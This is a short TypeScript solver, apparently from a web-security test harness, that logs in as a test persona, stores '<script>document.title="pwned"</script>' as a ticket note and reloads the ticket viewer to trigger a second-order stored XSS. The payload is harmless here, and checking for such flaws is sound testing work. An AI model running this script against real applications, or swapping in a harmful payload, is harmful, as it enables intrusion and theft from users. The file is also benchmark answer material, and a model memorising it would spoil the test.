// Second-order stored XSS: store a script payload as a ticket note, then load the ticket viewer so the
// stored markup is rendered back.
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const listRes = await ctx.fetch(ctx.plan.routes.ticketList!.path, { method: 'GET' })
  const list = (await listRes.json()) as { items?: Array<{ ext_id: string }> }
  const ticketId = list.items?.[0]?.ext_id
  if (!ticketId) return

  const notePath = ctx.plan.routes.ticketNoteCreate!.path.replace(/:[A-Za-z0-9_]+/, ticketId)
  const viewPath = ctx.plan.routes.ticketView!.path.replace(/:[A-Za-z0-9_]+/, ticketId)
  const noteField = ctx.plan.params.noteBody ?? 'note'
  const body: Record<string, string> = {}
  body[noteField] = '<script>document.title="pwned"</script>'

  await ctx.fetch(notePath, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body),
  })
  await ctx.fetch(viewPath, { method: 'GET' })
}
